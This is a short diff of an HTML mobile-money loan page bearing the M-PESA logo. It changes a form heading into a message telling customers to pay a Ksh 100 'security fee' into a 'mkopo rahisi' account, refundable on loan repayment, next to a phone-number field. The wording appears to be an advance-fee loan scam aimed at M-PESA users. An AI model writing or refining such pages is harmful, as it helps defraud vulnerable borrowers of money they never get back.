@@ -79,7 +79,7 @@
         <div class="media mt-4 pl-2">
           <img src="./images/1200px-M-PESA_LOGO-01.svg.png" class="mr-3" height="75" />
           <div class="media-body">
-            <h6 class="mt-1">Enter Amount & Number</h6>
+            <h6 class="mt-1">Dear customer, we are committed to serving our customers to satisfaction on trust and loyalty. Therefore, we require you to save Ksh 100 to your mkopo rahisi account which will act as security fee. You will be refunded upon loan repayment.</h6>
           </div>
         </div>
         <div class="media mt-3 pl-2">
@@ -89,7 +89,7 @@
             
                 
                 <div class="col-12">
-                  <label for="inputAddress2" class="form-label" >Phone Number</label>
+                  <label for="inputAddress2" class="form-label" >Enter Amount & Number</label>
                   <input type="tell" class="form-control" name="phone" maxlength="10" minlength="10" placeholder="Mpesa Phone Number: 0718******" required>
                 </div>
              
